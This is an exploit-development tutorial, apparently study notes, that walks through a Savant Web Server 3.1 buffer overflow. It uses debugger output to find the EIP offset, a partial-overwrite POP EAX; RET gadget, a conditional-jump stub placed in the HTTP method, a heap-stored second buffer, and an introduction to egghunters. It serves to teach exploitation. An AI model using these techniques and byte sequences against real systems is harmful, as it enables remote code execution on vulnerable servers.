# Our buffer is not always in a predictable location

Normally, in the base stack overflows, after we overwrite EIP we see that the ESP register points to our controlled buffer, which would store the shellcode. Then, we find a JMP ESP to jump to our shellcode.
However, there are some scenarios in which our shellcode is not directly accessible via ESP, or in a predictable location in memory.
Sometimes, it is possible to store a payload **somewhere else in the address space of the process,** and point to such address by "searching" for our payload in the code.
Let's see how to do it.
First, we have the Savant Web Server 3.1, which has a vulnerability that allows us overwriting EIP via a large HTTP GET buffer:
```c
0:011> g
(c3c.18f0): Access violation - code c0000005 (first chance)
First chance exceptions are reported before any exception handling.
This exception may be expected and handled.
eax=ffffffff ebx=01775868 ecx=e319c4c3 edx=00000000 esi=01775868 edi=0041703c
eip=41414141 esp=02d2ea1c ebp=41414141 iopl=0         nv up ei pl nz na po nc
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00010202
41414141 ??              ???¡
```

We have managed to overwrite the EIP.
However, let's inspect ESP to see how much bytes do we have stored:
```C
0:004> dd esp L5
02d2ea1c  00414141 02d2ea74 0041703c 01775868
02d2ea2c  01775868
```

Only three bytes have been available. The fourth byte is a null terminator, which means that our payload probably is stored as a string. Therefore, we cannot put our shellcode as we would in a vanilla stack overflow.
Whenever we deal with a limited amount of space, we should try to increase the size of the buffer to see if that results in more space for our overflow.

However, if the buffer size is increased, even by one byte, **a different crash where we do not gain control over the instruction pointer happens:**
```c
0:009> g
(c98.664): Access violation - code c0000005 (first chance)
First chance exceptions are reported before any exception handling.
This exception may be expected and handled.
*** WARNING: Unable to verify checksum for C:\Savant\Savant.exe
eax=41414141 ebx=01745868 ecx=005a0000 edx=005a0000 esi=01745868 edi=0041703c
eip=0040c05f esp=04f6e6a8 ebp=04f6ea14 iopl=0         nv up ei pl zr na pe nc
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00010246
```
Note that putting a big buffer always will make things go wrong! Start by a little buffer and keep incrementing it.

Let's go back to the scenario where we control EIP.
Let's analyze if any register stores our payload, so we can maybe perform a JMP REGISTER operation. An example with EBX:
```c
0:004> dds ebx
00505868  00001910
0050586c  000003e8
00505870  00000000
```

None of the registers point to our buffer.

The next thing is to search in the stack frame if there is any pointer to our buffer:
```c
0:004> dds esp L2
0505ea1c  00414141 Savant+0x14141
0505ea20  0505ea74
```

By some reason, the second DWORD in a stack points to a **location that is very close to the stack! It's like pointing an internal stack location.** Let's analyze it:
```c
0:004> dc 0505ea74
0505ea74  00544547 00000000 00000000 00000000  GET.............
0505ea84  00000000 00000000 4141412f 41414141  ......../AAAAAAA
0505ea94  41414141 41414141 41414141 41414141  AAAAAAAAAAAAAAAA
0505eaa4  41414141 41414141 41414141 41414141  AAAAAAAAAAAAAAAA
0505eab4  41414141 41414141 41414141 41414141  AAAAAAAAAAAAAAAA
0505eac4  41414141 41414141 41414141 41414141  AAAAAAAAAAAAAAAA
0505ead4  41414141 41414141 41414141 41414141  AAAAAAAAAAAAAAAA
0505eae4  41414141 41414141 41414141 41414141  AAAAAAAAAAAAAAAA
```

It looks like it's a pointer to the HTTP request content, as, in such location, we can see that there is the HTTP Method stored, followed by several null bytes, and our controlled buffer.

# Badchars do not break the buffer, they break the program behavior
In the previous buffer overflows, when inserting badchars to check the presence of them, we could see the specific characters that make the buffer break, as the application still crashes and we can inspect the badchar buffer in depth.

But there can be the case where inserting badchars just **prevent the application from crashing, or that make the application crash but the EIP is not overwritten anymore.** In that case, we cannot see which one is the problematic one, but we have to infer it by other means.
That is why it is important to always try sending a buffer with the same character, and always a character that is commonly accepted, as "A".

In order to detect which badchars are preventing the application from crashing, we will do a binary search.
The first half of the badchars will be sent, while the other is not sent. We will analyze in which half of the badchars array the application keeps running, and in which one does not. We will keep repeating such process iteratively until we find the badchar(s) that are preventing the application from running.

By doing this in our Savant application, we overwrite the instruction pointer when the second half of the badchars are sent. That means that the badchars are in the first half. We will break the first half in two to detect which badchars are the problematic, and so on.
After deleting some badchars, we see that the app crashes and EIP is overwritten, but we have to inspect if any of the badchars are not stored in the buffer like we previously did n the base buffer overflow:

```C
0:005> dd esp L30
0473ea1c  0473fe00 0473ea74 0041703c 005d2bf0
0473ea2c  005d2bf0 00000000 00000000 00000000
0473ea3c  00000000 00000000 00000000 00000000
0473ea4c  00000000 00000000 00000000 00000000
0473ea5c  00000000 00000000 00000000 00000000
0473ea6c  00000000 00000002 00544547 00000000
0473ea7c  00000000 00000000 00000000 00000000
0473ea8c  0302012f 07060504 0c0b0908 11100f0e
0473ea9c  15141312 19181716 1d1c1b1a 21201f1e
0473eaac  25242322 29282726 2d2c2b2a 31302f2e
0473eabc  35343332 39383736 3d3c3b3a 41403f3e
0473eacc  45444342 49484746 4d4c4b4a 51504f4e
0:005> db 0473ea8D LFF
0473ea8d  01 02 03 04 05 06 07 08-09 0b 0c 0e 0f 10 11 12  ................
0473ea9d  13 14 15 16 17 18 19 1a-1b 1c 1d 1e 1f 20 21 22  ............. !"
0473eaad  23 24 25 26 27 28 29 2a-2b 2c 2d 2e 2f 30 31 32  #$%&'()*+,-./012
0473eabd  33 34 35 36 37 38 39 3a-3b 3c 3d 3e 3f 40 41 42  3456789:;<=>?@AB
0473eacd  43 44 45 46 47 48 49 4a-4b 4c 4d 4e 4f 50 51 52  CDEFGHIJKLMNOPQR
0473eadd  53 54 55 56 57 58 59 5a-5b 5c 5d 5e 5f 60 61 62  STUVWXYZ[\]^_`ab
0473eaed  63 64 65 66 67 68 69 6a-6b 6c 6d 6e 6f 70 71 72  cdefghijklmnopqr
0473eafd  73 74 75 76 77 78 79 7a-7b 7c 7d 7e 7f 80 81 82  stuvwxyz{|}~....
0473eb0d  83 84 85 86 87 88 89 8a-8b 8c 8d 8e 8f 90 91 92  ................
0473eb1d  93 94 95 96 97 98 99 9a-9b 9c 9d 9e 9f a0 a1 a2  ................
0473eb2d  a3 a4 a5 a6 a7 a8 a9 aa-ab ac ad ae af b0 b1 b2  ................
0473eb3d  b3 b4 b5 b6 b7 b8 b9 ba-bb bc bd be bf c0 c1 c2  ................
0473eb4d  c3 c4 c5 c6 c7 c8 c9 ca-cb cc cd ce cf d0 d1 d2  ................
0473eb5d  d3 d4 d5 d6 d7 d8 d9 da-db dc dd de df e0 e1 e2  ................
0473eb6d  e3 e4 e5 e6 e7 e8 e9 ea-eb ec ed ee ef f0 f1 f2  ................
0473eb7d  f3 f4 f5 f6 f7 f8 f9 fa-fb fc fd fe ff 41 41     .............AA
```

0D is not appearing, so we can delete it although it is not breaking the buffer, it is completely ignored so if our shellcode has such character it probably will be skipped by the program.
After deleting 0d, the EIP does not point to our controlled location and we have to perform a binary search again.
We end detecting all the badchars via different methods. **Note that you could have to go back and forth with the different methods as each badchar can make the application behave different.**

Now, if we try to obtain the number off bytes that we have to send to overwrite EIP via the `msf-pattern_create` tool, we obtain that it causes a different access violation in which our instrucction pointer is not ovewritten with an unique value, as we would expect.
We have to **also manually split the buffer using different characters to manually detect the offset by analyzing which value does EIP have.**
If we do that, we will detect that it's 253 bytes prior to the instruction pointer.
```c
*** WARNING: Unable to verify checksum for Savant.exe
eax=ffffffff ebx=001c2bf0 ecx=21d8b80f edx=00000000 esi=001c2bf0 edi=0041703c
eip=42424242 esp=0489ea1c ebp=41414141 iopl=0         nv up ei pl nz na po nc
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00010202
42424242 ??              ???
0:009> dds esp
0489ea1c  00434343 Savant+0x34343
0489ea20  0489ea74
0489ea24  0041703c Savant+0x1703c
```
Again, we only have 3 bytes in ESP so we cannot store our shellcode there. But we have controlled EIP.
Now that we have confirmed that the offset is correct, we need to find a good instruction to overwrite EIP with that will allow us to take control of the execution flow.
Let's use the narly WinDbg extension to list the protections of the loaded modules.
To make our exploit as portable as possible, we need to choose a module that comes with the application. In addition, the module should not be compiled with any protections.
Let’s load the extension and list the protections of all loaded modules:
```c
0:009> !nmod
00400000 00452000 Savant               /SafeSEH OFF                Savant.exe
62f10000 63120000 comctl32_62f10000    /SafeSEH ON  /GS *ASLR *DEP C:\Windows\WinSxS\x86_microsoft.windows.common-controls_6595b64144ccf1df_6.0.19041.5678_none_a867ae788670d4c7\comctl32.DLL
679b0000 67a45000 TextShaping          /SafeSEH ON  /GS *ASLR *DEP C:\Windows\SYSTEM32\TextShaping.dll
69d80000 69d8e000 winrnr               /SafeSEH ON  /GS *ASLR *DEP C:\Windows\System32\winrnr.dll
69d90000 69da0000 wshbth               /SafeSEH ON  /GS *ASLR *DEP C:\Windows\system32\wshbth.dll
6a230000 6a246000 pnrpnsp              /SafeSEH ON  /GS *ASLR *DEP C:\Windows\system32\pnrpnsp.dll
6a980000 6a991000 napinsp              /SafeSEH ON  /GS *ASLR *DEP C:\Windows\system32\napinsp.dll
6bfd0000 6c05d000 COMCTL32             /SafeSEH ON  /GS *ASLR *DEP C:\Windows\WinSxS\x86_microsoft.windows.common-controls_6595b64144ccf1df_5.82.19041.4355_none_c0dc01d438beab35\COMCTL32.dll
6c980000 6c988000 WSOCK32              /SafeSEH ON  /GS *ASLR *DEP C:\Windows\SYSTEM32\WSOCK32.dll
```

The Savant module (main application) does not have any protection. **However, it is mapped at an address that contains a null byte at the start.** Having a null byte in the address space of the module is an issue, as the application will treat our buffer as a string when inserting the instruction in EIP. A null byte is a string terminator. We need a different approach.

Choosing an address of the other modules, which are Microsoft modules, would mean that the exploit is **dependent on whatever version on Windows is installed on our target (as these DLLs probably will change)**. In addition, we also have to deal with another mitigations like ASLR.

To overcome this issue, we will abuse something that we have already discovered: Our buffer is treated as a string and therefore a null byte is added at the end of it. Remember it: 
```c
0:009> dds esp
0489ea1c  00434343 Savant+0x34343
```

This provides us with an interesting opportunity to use a technique known as a **partial EIP overwrite**.
Because the module we want to attack is mapped in an address range that begins with a null byte, we could use the null byte that the application inserts on our buffer as part of our overwrite.

Indeed, if we send as payload only three bytes to overwrite EIP, we still get the same null byte applied:
```c
0:009> dds esp
0489ea1c  00434343 Savant+0x34343
```

So we could insert any address inside the Savant module using the null byte that is added in that position. But now we need to decide what instruction we want to redirect the execution flow to. The bad thing is that ESP does not point to our buffer nor any register.

During our initial crash analysis, we noticed that the second DWORD on the stack at the time of the crash points very close to our current stack pointer.
In fact, it always seems to point to the HTTP method, followed by the rest of the data we sent:
```c
0:004> dds esp L2
0505ea1c  00414141 Savant+0x14141
0505ea20  0505ea74

0:004> dc 0505ea74
0505ea74  00544547 00000000 00000000 00000000  GET.............
0505ea84  00000000 00000000 4141412f 41414141  ......../AAAAAAA
0505ea94  41414141 41414141 41414141 41414141  AAAAAAAAAAAAAAAA
0505eaa4  41414141 41414141 41414141 41414141  AAAAAAAAAAAAAAAA
0505eab4  41414141 41414141 41414141 41414141  AAAAAAAAAAAAAAAA
0505eac4  41414141 41414141 41414141 41414141  AAAAAAAAAAAAAAAA
0505ead4  41414141 41414141 41414141 41414141  AAAAAAAAAAAAAAAA
0505eae4  41414141 41414141 41414141 41414141  AAAAAAAAAAAAAAAA
```

Our goal then is to find an assembly instruction sequence that redirects the execution flow to this data.
Thinking that this value is the second value in ESP, we could do a POP, RET instruction:
The first POP would remove the first DWORD from the stack.
This would make ESP point to the memory address that contains our buffer starting with the HTTP GET method. After executing the RET instruction, we should be placed right at the beginning of our HTTP method.
Using such an instruction sequence would mean that we will have to execute the assembly instructions generated by the GET method opcodes. Let's see this instructions:
```c
0:008> dds poi(esp+4)
047bea74  00544547
047bea78  00000000
047bea7c  00000000
047bea80  00000000
047bea84  00000000
047bea88  00000000
047bea8c  4141412f
047bea90  41414141
047bea94  41414141
047bea98  41414141

0:008> u poi(esp+4)
047bea74 47              inc     edi
047bea75 45              inc     ebp
047bea76 54              push    esp
047bea77 0000            add     byte ptr [eax],al
047bea79 0000            add     byte ptr [eax],al
047bea7b 0000            add     byte ptr [eax],al
047bea7d 0000            add     byte ptr [eax],al
047bea7f 0000            add     byte ptr [eax],al
```

The first instructions do not seem to affect the execution flow or generate any access violations. They are INC operations, and a PUSH instruction that pushes ESP to the stack.  The "00" instructions use the ADD operation, using the memory address of where EAX points. **These instructions could be problematic as they assume that EAX points to a valid memory address.**
Remember that we want to perform the POP, RET operation?
Let's see if the value we want to POP (the top of the stack) is a valid memory address:

```c
0:008> !teb
TEB at 00258000
    ExceptionList:        01a3ff60
    StackBase:            01a40000
    StackLimit:           01a3c000
    SubSystemTib:         00000000
    FiberData:            00001e00
    ArbitraryUserPointer: 00000000
    Self:                 00258000
    EnvironmentPointer:   00000000
    ClientId:             00000ec0 . 00000cc0
    RpcHandle:            00000000
    Tls Storage:          004c7520
    PEB Address:          00253000
    LastErrorValue:       10038
    LastStatusValue:      c0000008
    Count Owned Locks:    0
    HardErrorMode:        0
0:008> dds esp
01a3ea1c  01a3fe00 // We are popping this value
01a3ea20  01a3ea74 // We want to return here, address of where our payload is stored
```

The value that we are popping is inside the StackBase and StackLimit addresses, which means that it is inside the stack! As it is a valid address, we will pop it into EAX so that the instructions that use EAX are valid!
We need to find a POP EAX, RET instructions inside the Savant module. Let's see which instructions are:
```c
msf-nasm_shell
nasm > pop eax
00000000  58                pop eax                                                                             
nasm > ret
00000000  C3                ret 
```

Let's search for these instructions in the module and pick any of them that does not contain badchars:
```c
0:008> lm m savant
Browse full module list
start    end        module name
00400000 00452000   Savant   C (no symbols)           
0:008> s -b 00400000 00452000   58 c3
00418674  58 c3 33 c0 c3 55 8b ec-51 51 83 7d 08 00 ff 75  X.3..U..QQ.}...u
0041924f  58 c3 a1 68 a2 44 00 56-83 f8 03 57 75 66 53 33  X..h.D.V...WufS3
004194f6  58 c3 33 c0 c3 a1 68 a2-44 00 83 f8 03 75 06 a1  X.3...h.D....u..
00419613  58 c3 a1 4c a2 44 00 8d-0c 80 a1 50 a2 44 00 8d  X..L.D.....P.D..
0041a531  58 c3 33 c0 c3 83 3d 68-ae 43 00 ff 53 55 56 57  X.3...=h.C..SUVW
0041af7f  58 c3 8b 65 e8 33 db 33-f6 83 4d fc ff 3b f3 74  X..e.3.3..M..;.t
0041b464  58 c3 33 c0 c3 55 8b ec-83 ec 0c 8b 45 0c 53 56  X.3..U......E.SV
0041b9fa  58 c3 33 c0 c3 0f b6 44-24 04 8a 4c 24 0c 84 88  X.3....D$..L$...
0041ba2e  58 c3 55 8b ec 83 ec 18-53 56 57 6a 19 e8 b6 f3  X.U.....SVWj....
0041c49a  58 c3 e8 c6 b9 ff ff 83-c0 54 c3 55 8b ec 81 ec  X........T.U....
0041cc30  58 c3 8b 65 e8 33 ff 89-7d dc 83 4d fc ff 8b 5d  X..e.3..}..M...]
0041cce4  58 c3 8b 65 e8 33 ff 33-db 83 4d fc ff 8b 75 d8  X..e.3.3..M...u.
0041eb74  58 c3 33 c0 c3 55 8b ec-83 ec 78 8d 45 88 6a 78  X.3..U....x.E.jx
0041fe21  58 c3 8b 65 e8 33 ff 89-7d d4 83 4d fc ff 8b 75  X..e.3..}..M...u
0041fe7e  58 c3 8b 65 e8 33 ff 33-db 83 4d fc ff 3b df 74  X..e.3.3..M..;.t
00420904  58 c3 8b 65 e8 33 ff 33-f6 83 4d fc ff 3b f7 74  X..e.3.3..M..;.t
00420a1d  58 c3 8b 65 e8 33 f6 33-ff 83 4d fc ff 3b fe 74  X..e.3.3..M..;.t
00420e69  58 c3 8b 65 e8 33 db 89-5d dc 83 4d fc ff 8b 75  X..e.3..]..M...u
00420ed8  58 c3 8b 65 e8 33 db 33-ff 83 4d fc ff 8b 75 e0  X..e.3.3..M...u.
```

The first one is a good candidate. Replacing such address with the EIP overwrite leads us in landing to such address. Let's analyze it:
```c
0:009> bp 0x418674
*** WARNING: Unable to verify checksum for Savant.exe
0:009> g
Breakpoint 0 hit
eax=00000000 ebx=016d2bf0 ecx=0000000e edx=77732da0 esi=016d2bf0 edi=0041703c
eip=00418674 esp=0481ea1c ebp=41414141 iopl=0         nv up ei pl nz na po nc
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000202
Savant+0x18674:
00418674 58              pop     eax
0:004> t
Breakpoint 0 hit
eax=00000000 ebx=016d2bf0 ecx=0000000e edx=77732da0 esi=016d2bf0 edi=0041703c
eip=00418674 esp=0481ea1c ebp=41414141 iopl=0         nv up ei pl nz na po nc
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000202
Savant+0x18674:
00418674 58              pop     eax
0:004> t
eax=0481fe60 ebx=016d2bf0 ecx=0000000e edx=77732da0 esi=016d2bf0 edi=0041703c
eip=00418675 esp=0481ea20 ebp=41414141 iopl=0         nv up ei pl nz na po nc
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000202
Savant+0x18675:
00418675 c3              ret

0:004> dds esp
0481ea20  0481ea74
0481ea24  0041703c Savant+0x1703c

0:004> dds poi(esp)
0481ea74  00544547
0481ea78  00000000
0481ea7c  00000000
0481ea80  00000000
0481ea84  00000000
0481ea88  00000000
0481ea8c  4141412f
0481ea90  41414141
0481ea94  41414141
0481ea98  41414141
```

We can see that now we are landing on the address that we want.
Because we made sure that EAX would contain a valid memory address, we should be able to execute these instructions without generating an access violation, until we reach our buffer of 0x41 characters.
While this solution works, executing assembly instructions generated by the opcodes of our HTTP method **is not very clean.** Let’s explore some other options in the hopes of finding a more elegant way of reaching the start of our 0x41 buffer.

First, let's think that we are sending the GET method in our request, as well as the route, and such values are the ones being interpreted when the pop, ret instruction occurs.
What if we change the HTTP method used and insert some bytes? If instruction bytes can be inserted, when performing the jump, it would jump to our controlled instruction. We could insert a short jump instruction instead of GET in order to jump directly to our payload.
Let's try to modify the method used and insert some "C" characters as the method. They get reflected:
```c
Savant+0x18674:
00418674 58              pop     eax
0:008> dc poi(esp+4)
0478ea74  43434343 43434343 00000000 00000000  CCCCCCCC........
0478ea84  00000000 00000000 4141412f 41414141  ......../AAAAAAA
0478ea94  41414141 41414141 41414141 41414141  AAAAAAAAAAAAAAAA
0478eaa4  41414141 41414141 41414141 41414141  AAAAAAAAAAAAAAAA
0478eab4  41414141 41414141 41414141 41414141  AAAAAAAAAAAAAAAA
0478eac4  41414141 41414141 41414141 41414141  AAAAAAAAAAAAAAAA
0478ead4  41414141 41414141 41414141 41414141  AAAAAAAAAAAAAAAA
0478eae4  41414141 41414141 41414141 41414141  AAAAAAAAAAAAAAAA
```

Now, we want to replace our "C"s for a short jump instruction. Let's see how much bytes do we have to jump:
```c
0:008> db poi(esp+4)
0478ea74  43 43 43 43 43 43 43 43-00 00 00 00 00 00 00 00  CCCCCCCC........
0478ea84  00 00 00 00 00 00 00 00-2f 41 41 41 41 41 41 41  ......../AAAAAAA
0478ea94  41 41 41 41 41 41 41 41-41 41 41 41 41 41 41 41  AAAAAAAAAAAAAAAA
0478eaa4  41 41 41 41 41 41 41 41-41 41 41 41 41 41 41 41  AAAAAAAAAAAAAAAA
0478eab4  41 41 41 41 41 41 41 41-41 41 41 41 41 41 41 41  AAAAAAAAAAAAAAAA
0478eac4  41 41 41 41 41 41 41 41-41 41 41 41 41 41 41 41  AAAAAAAAAAAAAAAA
0478ead4  41 41 41 41 41 41 41 41-41 41 41 41 41 41 41 41  AAAAAAAAAAAAAAAA
0478eae4  41 41 41 41 41 41 41 41-41 41 41 41 41 41 41 41  AAAAAAAAAAAAAAAA
```

Now let's put a breakpoint on TBD and perform the short jump operation:

```c
0:008> a eip
0478ea74 jmp 0x0478ea8d 
jmp 0x0478ea8d 
0478ea76 

0:008> u eip
0478ea74 eb17            jmp     0478ea8d
```

We would have to add eb17 as the HTTP method.
However, when inserting it, we see that the "eb" bytes are replaced for "cb", meaning that such character has been mangled:
```c
0475ea74 cb              retf
0475ea75 17              pop     ss
0475ea76 0000            add     byte ptr [eax],al
0475ea78 0000            add     byte ptr [eax],al
```

Given that this memory is most likely allocated separately from the allocation storing the rest of the buffer, **it is possible that different operations are done that cause our byte to get mangled.** Therefore, take note as you might find different memory allocations with different checks and operations performed on the data stored in them, and you have to find a different set of bad characters for such section.
For now, let's assume that we can't use a short jump operation.
We need another solution. We could maybe use the island hopping technique, modifying the ESP to point to our buffer and jump to it.
However, we are going to see other alternative. Let's see **conditional jumps.**
Conditional jumps are a jump operation that only is executed is specific conditions are done. This process occurs in two steps.
The first step is a test on the condition, and the second step is a jump depending on the condition.
Note: There are a number of conditional jumps in the assembly language that depend on registry values, FLAG registers, and comparisons between signed or unsigned operands.
While we do have a limited memory space that is allocated for the HTTP method, it should still be more than enough for us to set up a condition followed by a jump for that condition.
**We will use the JE (Jump if Equal) condition. This instruction will execute a short jump and the condition from the jump is based on the value of the ZF (Zero Flag) register. More specifically, the jump is taken if the value of the ZF register is 1 (TRUE).**
Note: The Zero Flag register is a single bit flag that is used on most architectures. On x86/x64, it is stored in a dedicated register called ZF. This flag is used to check the result of arithmetic operations. It is set to 1 (TRUE) if the result of an arithmetic operation is zero and otherwise set to 0 (FALSE).

In order to jump, we need to set the value of the ZF to 1 so that the condition is true. 
To archieve that, we will use a XOR operation between a register as destination and as source. Any register is valid, as long as the instruction does not contain badchars. **Doing a XOR with the same destination and source sets the register to 0, nulling the register**. 
After the XOR, we will do a TEST instruction with the same register as both operands. As the result is 0, the ZF results to be 1.
Then we can perform the JE o JZ (they both check if ZF is set to 1). 
Let's craft these operations (we will use ECX as the dummy register for the XOR and TEST operations):

```c
nasm > xor ecx, ecx
00000000  31C9              xor ecx,ecx
nasm > test ecx, ecx
00000000  85C9              test ecx,ecx
nasm > je 0x17
00000000  0F8411000000      jz near 0x17
```

The last instruction contains three null bytes. This is problematic but remember that the rest of the space between the HTTP method and the slash and our payload is full of zeros. We can skip from sending these null bytes as they will be already stored in such place by the application:
```python
httpMethod = b"\x31\xC9\x85\xC9\x0F\x84\x11" + b" /"  # xor ecx, ecx; test ecx, ecx; je 0x17
```

If we send this and analyze the code, now the instructions are not mangled and that it is a clean jump to our shellcode:
```c
046bea74 31c9            xor     ecx,ecx
046bea76 85c9            test    ecx,ecx
046bea78 0f8411000000    je      046bea8f

0:008> u 046bea8f
046bea8f 41              inc     ecx
046bea90 41              inc     ecx
046bea91 41              inc     ecx
046bea92 41              inc     ecx
046bea93 41              inc     ecx
046bea94 41              inc     ecx
046bea95 41              inc     ecx
```

Let's see the ZF value after the XOR and TEST operations:
```c
0:008> r zf
zf=1
0:008> t
eax=046bfe60 ebx=01822bf0 ecx=00000000 edx=77ea2da0 esi=01822bf0 edi=0041703c
eip=046bea78 esp=046bea24 ebp=41414141 iopl=0         nv up ei pl zr na pe nc
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000246
046bea78 0f8411000000    je      046bea8f                                [br=1]
0:008> t
eax=046bfe60 ebx=01822bf0 ecx=00000000 edx=77ea2da0 esi=01822bf0 edi=0041703c
eip=046bea8f esp=046bea24 ebp=41414141 iopl=0         nv up ei pl zr na pe nc
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000246
046bea8f 41              inc     ecx
```

We successfully landed on our code, but if we see closely, we land on a 2 byte offset:
```c
0:008> dd 046bea8f-4
046bea8b  41412f00 41414141 41414141 41414141
```
This is not a problem as we can fix the offset, or add some NOPs before our shellcode in case that the offset is not consistent.
Once we know how to execute our code, the next step is to see if we have enough space.

After calculating how many "A"s does the buffer store, we see that the result is 251 bytes.
While generating a reverse shell payload in previous modules, the size of the resulting shellcode was over 300 bytes. A more advanced payload, such as a Meterpreter, would require even more space.
Even if we were to use the HTTP method buffer, rather than jumping over it, we would still not have enough space for a large payload.

Therefore, we have to find a way to store a larger shellcode in our current exploit.

# Storing the shellcode in the heap
We have to find a way to store the shellcode in other place of the application. Another option is to use a smaller payloads with fewer features, but this is a last resort.
We have to store our shellcode in a different memory region before the crash and then redirect the execution flow to that additional buffer. We will use the space we already have to create a "stager" shellcode that jumps to this second memory region, once we find it.
To determine what will be stored in memory by our vulnerable application, we could either perform a very in-depth reverse engineering process on the application, or we could make some educated guesses based on the type of application we are attacking.
In the case of this application, a web server, we could do two things:
- Rather than terminating the HTTP request with `\r\n`, we can try to add an additional buffer between the carriage return and the new line. **Doing this results in the application not crashing, which means that this method does not work here.**
- Sending a buffer after we end the HTTP request (after `\r\n`). Doing this results in hitting our POP, RET breakpoint and in a crash, so we will stick to this method.

Once we manage to add another shellcode of a bigger space (400 bytes), we need to find where is it stored in memory. For that, some bytes of the shellcode have been given a special value (in my case "w00tw00t") so it is possible to find them.
Now, let's find this bytes once we hit the breakpoint:
```c
0:004> s -a 0x0 L?80000000 w00tw00t
01805a86  77 30 30 74 77 30 30 74-41 41 41 41 41 41 41 41  w00tw00tAAAAAAAA
```

Seems that we were able to locate our payload. Now, let's see if the shellcode is complete by adding 400 bytes:
```c
0:004> db 01805a86 +0n400
01805c16  41 41 41 41 41 41 41 41-00 00 00 00 00 00 00 00  AAAAAAAA........
```

After a 400 bytes offset, our payload is stored still. That means that we can store our complete buffer here as we have space.
**Now, let's see where this buffer is stored.**

Let's check if it is in the stack of the thread:
```c
0:004> !teb
TEB at 002bc000
    ExceptionList:        02d4ff60
    StackBase:            02d50000
    StackLimit:           02d4c000
```

Surprising, it is not in the current stack.
Let's use an extension from WinDbg called !address that tells us in which memory region our shellcode is:
```c
0:004> !address 01805a86  
                                 
Mapping file section regions...
Mapping module regions...
Mapping PEB regions...
Mapping TEB and stack regions...
Mapping heap regions...
Mapping page heap regions...
Mapping other regions...
Mapping stack trace database regions...
Mapping activation context regions...

Usage:                  Heap
Base Address:           01800000
End Address:            0180f000
Region Size:            0000f000 (  60.000 kB)
State:                  00001000          MEM_COMMIT
Protect:                00000004          PAGE_READWRITE
Type:                   00020000          MEM_PRIVATE
Allocation Base:        01800000
Allocation Protect:     00000004          PAGE_READWRITE
More info:              heap owning the address: !heap 0x1800000
More info:              heap segment
More info:              heap entry containing the address: !heap -x 0x1805a86


Content source: 1 (target), length: 957a
```

According to this output, our buffer is stored on the **heap.**
In Windows operating systems, when a process starts, the Heap Manager automatically creates a new heap called the default process heap. At a very high level, heaps are big chunks of memory that are divided into smaller pieces to fulfill dynamic memory allocation requests.
Although some processes only use the default process heap, many will create additional heaps using the HeapCreate API (or its lower-level interface ntdll!RtlCreateHeap) to isolate different components running in the process itself.
Several user-space Windows APIs (VirtualAllocEx, VirtualFreeEx, HeapAlloc, and HeapFree) will eventually call into their respective native functions in ntdll.dll (RtlAllocateHeap and RtlFreeHeap).
Other processes make substantial use of the C Runtime heap for most dynamic allocations (malloc / free functions). These heap implementations, defined as NT Heap, eventually make use of the Windows Heap Manager functions in ntdll.dll to interface with the kernel Windows Virtual Memory Manager and to allocate memory dynamically.

The summary is that **there is no way to determine the location of the buffer before it is stored in memory.** This rules out the possibility of adding a **static offset, short jump, island hopping, or any of the previous techniques** to make the instruction pointer jump to this location.

We need to explore other methods of finding the location of our buffer as it is stored in the heap dinamically. This is where the egghunter approach comes.

# Egghunters
## What is an Egghunter
When we need to **find the memory address of another buffer under our control that does not take a static location, we often use an Egghunter.**
The term Egghunter refers to a first-stage payload that can **search the process virtual address space (VAS)** for an egg, an unique tag that **prepends** the payload we want to execute. Once the egg (pattern) has been found, the egghunter transfers the execution to the shellcode by jumping to the found address.

Since egghunters are made to deal with space restrictions, they are written to be as small as possible. Also, the egghunting code needs to be fast, as, the fastest it executes, the less time the application hangs.
These type of payloads also need to be robust and handle access violations that are raised while scanning the virtual address space. The access violations usually occur while attempting to access an unmapped memory address or addresses we don’t have access to.
In the past, we would typically write the assembly code for our egghunter and then proceed to compile the code. After, we would disassemble the compiled binary in software such as IDA to get the opcodes for it. However, this is very consuming and we have a better alternative.

## Keystone Engine
Writing shellcode is much more streamlined using a tool like Keystone Engine. This tool is an assembler framework for several languages, like Python. With it, we can write our ASM code in a Python script and let the Keystone framework do the rest.
Installing Keystone in Kali is pretty straightforward once Python3 is installed:
```bash
pip install keystone-engine
Collecting keystone-engine
  Downloading keystone_engine-0.9.2-py2.py3-none-manylinux1_x86_64.whl.metadata (1.8 kB)
Downloading keystone_engine-0.9.2-py2.py3-none-manylinux1_x86_64.whl (1.8 MB)
   ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━ 1.8/1.8 MB 22.5 MB/s eta 0:00:00
Installing collected packages: keystone-engine
Successfully installed keystone-engine-0.9.2
```

For example, let's use this snippet of code for a x64 architecture in 32 bits:
```python
from keystone import *  
  
CODE = (  
" "  
" start: "  
" xor eax, eax ;"  
" add eax, ecx ;"  
" push eax ;"  
" pop esi ;"  
)  
  
# Initialize engine in 32-bit mode  
ks = Ks(KS_ARCH_X86, KS_MODE_32)  
encoding, count = ks.asm(CODE)  
instructions = ""  
for dec in encoding:  
    instructions += "\\x{0:02x}".format(int(dec)).rstrip("\n")  
    print("Opcodes = (\"" + instructions + "\")")
```

Now, if we execute this program, the following result is obtained, crafting the opcodes instruction by instruction:
```c
Opcodes = ("\x31")
Opcodes = ("\x31\xc0")
Opcodes = ("\x31\xc0\x01")
Opcodes = ("\x31\xc0\x01\xc8")
Opcodes = ("\x31\xc0\x01\xc8\x50")
Opcodes = ("\x31\xc0\x01\xc8\x50\x5e")
```

Let's try to verify the opcodes using the tool that we already know called msf-nasm_shell:
```c
msf-nasm_shell                                                                                                 
nasm > xor eax, eax
00000000  31C0              xor eax,eax
nasm > add eax, ecx
00000000  01C8              add eax,ecx
nasm > push eax
00000000  50                push eax
nasm > pop esi
00000000  5E                pop esi
```

As we can see, the opcodes returned from the tool are exactly the same, but the tool is much more flexible as we will be able to test our assembly code much faster.
Please note that while Keystone saves a large amount of time, it is not without fault. 
Depending on the assembly code we are working with, some opcodes, like short jumps, may not be generated correctly. It's recommended going over the assembly instructions in memory (with a debugger) to confirm that the generated opcodes are correct.

## Analyzing a public Egghunter
